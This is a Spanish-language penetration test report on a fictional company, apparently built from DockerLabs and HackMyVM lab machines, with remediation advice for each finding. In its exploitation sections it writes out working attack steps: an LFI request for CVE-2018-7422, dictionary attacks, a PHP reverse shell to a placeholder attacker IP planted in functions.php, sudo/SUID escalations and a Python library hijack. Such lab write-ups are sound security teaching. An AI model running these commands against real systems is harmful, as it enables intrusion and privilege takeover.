# Informe de Auditoría de Seguridad
## EasyTechSolutionsNow S.A.

**Clasificación:** Confidencial  
**Fecha:** Abril 2026  
**Auditor:** Víctor (ladybaba2000)  
**Entorno:** Laboratorio controlado — DockerLabs / HackMyVM  

---

## 1. Planificación de la Auditoría

### 1.1 Alcance y objetivos

La auditoría cubre los siguientes ámbitos de la infraestructura de EasyTechSolutionsNow S.A.:

- Infraestructura de red (servidores Windows y Linux)
- Aplicaciones web públicas (WordPress)
- Sistema de gestión de dominios internos (Active Directory)
- Base de datos accedida mediante formulario web

### 1.2 Metodología

La auditoría sigue las fases estándar de un test de intrusión (pentest):

1. **Reconocimiento pasivo** — recopilación de información sin interactuar con los sistemas (OSINT, búsqueda en registros DNS, Shodan, Google Dorks)
2. **Reconocimiento activo** — escaneo directo de la infraestructura
3. **Enumeración** — identificación de servicios, versiones, usuarios y rutas
4. **Explotación** — aprovechamiento de vulnerabilidades identificadas
5. **Post-explotación y escalada** — obtención de privilegios elevados
6. **Documentación** — registro de hallazgos y recomendaciones

### 1.3 Herramientas utilizadas

| Fase | Herramienta | Propósito |
|------|-------------|-----------|
| Reconocimiento | nmap | Escaneo de puertos y detección de servicios |
| Reconocimiento | arp-scan | Descubrimiento de hosts en red local |
| Enumeración web | gobuster | Enumeración de directorios y archivos |
| Enumeración web | wpscan | Análisis de instalaciones WordPress |
| Fuerza bruta | hydra | Ataque de credenciales por diccionario |
| Fuerza bruta | john the ripper | Crackeo de hashes |
| Active Directory | BloodHound | Análisis de relaciones y permisos en AD |
| Active Directory | ldapdomaindump | Enumeración de objetos LDAP |
| Active Directory | impacket | Suite de herramientas para protocolos Windows |
| Explotación | searchsploit | Búsqueda de exploits conocidos |
| Post-explotación | GTFOBins | Referencia de binarios para escalada de privilegios |

### 1.4 Consideraciones legales

Toda la auditoría se realiza con autorización expresa de EasyTechSolutionsNow S.A. en un entorno controlado. Las técnicas empleadas se limitan al alcance acordado y no afectan a sistemas de terceros.

---

## 2. Revisión de Infraestructura de Red y Enumeración Web

### 2.1 Escaneo de red con Nmap

El primer paso es identificar los hosts activos y los servicios expuestos. Se utiliza nmap con los siguientes parámetros:

```bash
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn 172.17.0.2
```

**Parámetros utilizados:**

- `-p-` — escaneo de los 65535 puertos
- `-sS` — escaneo SYN (stealth), menos ruidoso que un escaneo completo
- `-sC` — scripts NSE por defecto para detección de vulnerabilidades comunes
- `-sV` — detección de versiones de servicios
- `--min-rate 5000` — velocidad mínima de paquetes por segundo
- `-n` — sin resolución DNS (más rápido)
- `-Pn` — sin ping previo (asume el host activo)

**Ejemplo de resultado obtenido en laboratorio:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian
80/tcp open  http    Apache httpd 2.4.59 (WordPress 6.5.3)
```

**Interpretación:**

- Puerto 22 (SSH) abierto — posible vector de acceso con credenciales
- Puerto 80 (HTTP) con WordPress — superficie de ataque web significativa
- La versión de WordPress (6.5.3) es anterior a la actual — puede contener vulnerabilidades conocidas

También se recomienda escaneo UDP para servicios como SNMP (puerto 161), que puede exponer información sensible del sistema:

```bash
sudo nmap -sU -p1-200 172.17.0.2
```

En laboratorio se comprobó que SNMP con community string `public` puede exponer credenciales en texto plano visibles en los procesos del sistema.

### 2.2 Enumeración de rutas web con Gobuster

Una vez identificado el servidor web, se enumeran directorios y archivos ocultos:

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
```

**Ejemplo de resultados:**

```
/wordpress/          (Status: 301)
/secret.php          (Status: 200) [Size: 26]
/server-status       (Status: 403)
```

**Interpretación:**

- `/wordpress/` confirma la instalación de WordPress
- `/secret.php` con tamaño de 26 bytes indica contenido mínimo — puede contener credenciales o información sensible (en laboratorio contenía un hash bcrypt de usuario admin)
- `/server-status` devuelve 403 (prohibido) pero confirma que Apache tiene el módulo status activo

---

## 3. Evaluación del Dominio — Active Directory

### 3.1 Herramientas de análisis

Para auditar un entorno Active Directory se emplearían las siguientes herramientas:

**BloodHound + SharpHound**

BloodHound permite visualizar las relaciones de confianza, permisos y rutas de escalada en un dominio Active Directory. SharpHound es el colector de datos que se ejecuta en el entorno Windows:

```powershell
.\SharpHound.exe -c All --outputdirectory C:\temp\
```

Los datos se importan en BloodHound para identificar rutas hacia Domain Admin, cuentas con Kerberoasting, delegaciones peligrosas, etc.

**ldapdomaindump**

Enumera todos los objetos del dominio (usuarios, grupos, equipos, políticas) via LDAP:

```bash
ldapdomaindump -u 'DOMINIO\usuario' -p 'contraseña' 172.17.0.1
```

**Impacket**

Suite de herramientas Python para interactuar con protocolos Windows. Permite ataques como:

- `GetNPUsers.py` — AS-REP Roasting (usuarios sin preautenticación Kerberos)
- `GetUserSPNs.py` — Kerberoasting (obtención de tickets de servicio para crackeo offline)
- `secretsdump.py` — extracción de hashes NTLM del SAM o NTDS.dit

```bash
python3 GetUserSPNs.py DOMINIO/usuario:contraseña -dc-ip 172.17.0.1 -request
```

### 3.2 Vectores de ataque comunes en AD

- **Contraseñas débiles** — cuentas de servicio con contraseñas crackeables
- **Kerberoasting** — solicitud de tickets TGS para servicios y crackeo offline
- **Pass-the-Hash** — reutilización de hashes NTLM sin necesidad de contraseña en texto plano
- **Delegación no restringida** — equipos que pueden impersonar cualquier usuario del dominio
- **ACL abuse** — permisos excesivos sobre objetos del directorio (WriteDACL, GenericAll, etc.)

---

## 4. Auditoría de WordPress

### 4.1 Reconocimiento inicial

WordPress expone información útil por defecto. Antes de usar herramientas automatizadas se comprueban manualmente:

```
http://target/wp-login.php          # Panel de login
http://target/?author=1             # Enumeración de usuarios
http://target/wp-json/wp/v2/users   # API REST — lista de usuarios
http://target/wp-content/plugins/   # Plugins instalados (si hay directory listing)
```

En laboratorio se comprobó que `?author=1` redirige a `/author/mario/`, revelando el primer usuario registrado sin necesidad de herramientas.

### 4.2 Enumeración con WPScan

```bash
wpscan --url http://asucar.dl --enumerate u,p,t --plugins-detection aggressive
```

**Parámetros:**

- `--enumerate u` — usuarios
- `--enumerate p` — plugins
- `--enumerate t` — temas
- `--plugins-detection aggressive` — comprueba ubicaciones conocidas de plugins

**Hallazgo crítico en laboratorio — CVE-2018-7422:**

WPScan detectó el plugin `site-editor v1.1` desactualizado. Este plugin contiene una vulnerabilidad de Local File Inclusion (LFI) que permite leer archivos arbitrarios del sistema:

```bash
curl "http://asucar.dl/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd"
```

Esto permitió leer `/etc/passwd` y descubrir usuarios del sistema, y posteriormente obtener la clave privada SSH de un usuario en `/home/curiosito/.ssh/id_rsa`.

### 4.3 Fuerza bruta de credenciales

Una vez identificados usuarios, se realiza ataque de diccionario contra el panel de login. WPScan utiliza XML-RPC para evitar las limitaciones del formulario web:

```bash
wpscan --url http://172.17.0.2/wordpress/ -U mario -P /usr/share/wordlists/rockyou.txt
```

**Resultado en laboratorio:** `mario / love` — encontrado en 390 intentos en 4 segundos via XML-RPC.

**Recomendación:** Deshabilitar XML-RPC si no se usa, implementar limitación de intentos de login y usar contraseñas de al menos 12 caracteres con complejidad.

### 4.4 Explotación — RCE via Theme Editor

Con acceso de administrador al panel WordPress, es posible ejecutar código PHP arbitrario mediante el editor de temas:

**Ruta:** Appearance → Theme File Editor → `functions.php`

Se inserta una reverse shell PHP que se activa al cargar cualquier página del sitio:

```php
function reverse_shell() {
    $sock = fsockopen("ATACANTE_IP", 4444, $errno, $errstr, 30);
    $process = proc_open('/bin/bash', array(0=>$sock,1=>$sock,2=>$sock), $pipes);
}
add_action('init', 'reverse_shell');
```

```bash
nc -lvnp 4444
```

Esto proporciona una shell como `www-data` en el servidor.

---

## 5. Escalada de Privilegios

### 5.1 Permisos de sudo

El primer vector a comprobar tras obtener acceso es qué comandos puede ejecutar el usuario con privilegios elevados:

```bash
sudo -l
```

**Caso 1 — vim con sudo (laboratorio Trust):**

```
(ALL) /usr/bin/vim
```

vim permite ejecutar comandos del sistema desde su interfaz:

```bash
sudo vim -c ':!/bin/bash'
```

**Caso 2 — puttygen con sudo (laboratorio Asucar):**

```
(ALL) NOPASSWD: /usr/bin/puttygen
```

puttygen permite generar claves SSH y escribirlas en cualquier ruta del sistema, incluyendo `/root/.ssh/authorized_keys`, lo que permite acceso SSH directo como root.

**Recomendación:** El principio de mínimo privilegio debe aplicarse estrictamente. Nunca conceder sudo sobre editores de texto, intérpretes o herramientas de gestión de claves.

### 5.2 Binarios SUID

Los binarios con el bit SUID activado se ejecutan con los privilegios del propietario (normalmente root):

```bash
find / -perm -4000 -user root 2>/dev/null
```

**Caso — /usr/bin/env con SUID (laboratorios WordPress e Injection):**

```bash
/usr/bin/env /bin/bash -p
```

El flag `-p` preserva los privilegios del propietario del binario, proporcionando shell root directamente.

La referencia GTFOBins (https://gtfobins.github.io) documenta técnicas de escalada para decenas de binarios comunes cuando tienen SUID o sudo mal configurado.

**Recomendación:** Auditar regularmente los binarios con SUID y eliminar el bit cuando no sea estrictamente necesario.

### 5.3 Procesos en segundo plano

Los procesos corriendo como otros usuarios pueden revelar vectores de escalada:

```bash
ps aux
```

**Caso — ttyd corriendo como xcm (laboratorio GameShell4):**

```
root  sudo -u xcm ttyd -i 127.0.0.1 -p 7681 -W sudoku.sh
```

Se detectó un terminal web (ttyd) corriendo como el usuario `xcm` accesible mediante proxy Apache con autenticación básica. Esto permitió pivotar al usuario `xcm` y continuar la escalada.

### 5.4 Python Library Hijacking

Cuando un script Python con privilegios sudo importa una librería externa, es posible crear un archivo con el mismo nombre en un directorio con prioridad en el path de búsqueda de Python, reemplazando la librería legítima por código malicioso.

**Caso — laboratorio Library:**

```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/python3 /opt/script.py

cat /opt/script.py
# import shutil
# shutil.copy(origen, destino)
```

Python busca las librerías primero en el directorio del script (`/opt/`). Se crea un `shutil.py` falso:

```bash
cat > /opt/shutil.py << 'EOF'
import os
def copy(src, dst):
    os.system("chmod u+s /bin/bash")
EOF

sudo /usr/bin/python3 /opt/script.py
/bin/bash -p
# whoami → root
```

**Recomendación:** Usar rutas absolutas para las importaciones, restringir permisos de escritura en directorios donde se ejecutan scripts con privilegios y usar entornos virtuales aislados.

---

## 6. Resumen de Vulnerabilidades

| Severidad | Vulnerabilidad | Vector |
|-----------|---------------|--------|
| 🔴 Crítica | RCE via WordPress Theme Editor | Credenciales débiles + panel admin |
| 🔴 Crítica | LFI en plugin site-editor (CVE-2018-7422) | Plugin desactualizado |
| 🔴 Crítica | SQL Injection en formulario de login | Falta de sanitización de inputs |
| 🟠 Alta | Contraseñas débiles (mario/love, mario/chocolate) | Política de contraseñas insuficiente |
| 🟠 Alta | Python Library Hijacking via sudo | Configuración sudo incorrecta |
| 🟠 Alta | Binarios SUID explotables (env, find) | Permisos excesivos |
| 🟡 Media | XML-RPC habilitado en WordPress | Permite fuerza bruta sin rate limiting |
| 🟡 Media | Directory listing habilitado | Exposición de estructura de ficheros |
| 🟡 Media | Credenciales en .mysql_history | Gestión insegura de historial |
| 🟢 Baja | Versiones desactualizadas de software | Falta de política de actualizaciones |

---

## 7. Recomendaciones

1. **Política de contraseñas:** Exigir mínimo 12 caracteres con mayúsculas, minúsculas, números y símbolos. Implementar autenticación multifactor (MFA).

2. **Actualizaciones:** Mantener WordPress, plugins y temas siempre actualizados. Suscribirse a boletines de seguridad de los proveedores.

3. **Principio de mínimo privilegio:** Revisar y restringir las configuraciones de sudo. Eliminar bits SUID innecesarios.

4. **Deshabilitar XML-RPC:** Si no se usa, deshabilitar `xmlrpc.php` en WordPress para evitar ataques de fuerza bruta.

5. **Sanitización de inputs:** Implementar consultas preparadas (prepared statements) en todas las interacciones con la base de datos para prevenir SQL Injection.

6. **Gestión de secretos:** No almacenar credenciales en archivos de historial, código fuente ni JavaScript del lado cliente.

7. **Monitorización:** Implementar un sistema de detección de intrusiones (IDS) y revisión periódica de logs de acceso.

8. **Segmentación de red:** Separar los servidores web de las bases de datos y del entorno de Active Directory mediante VLANs y firewalls.
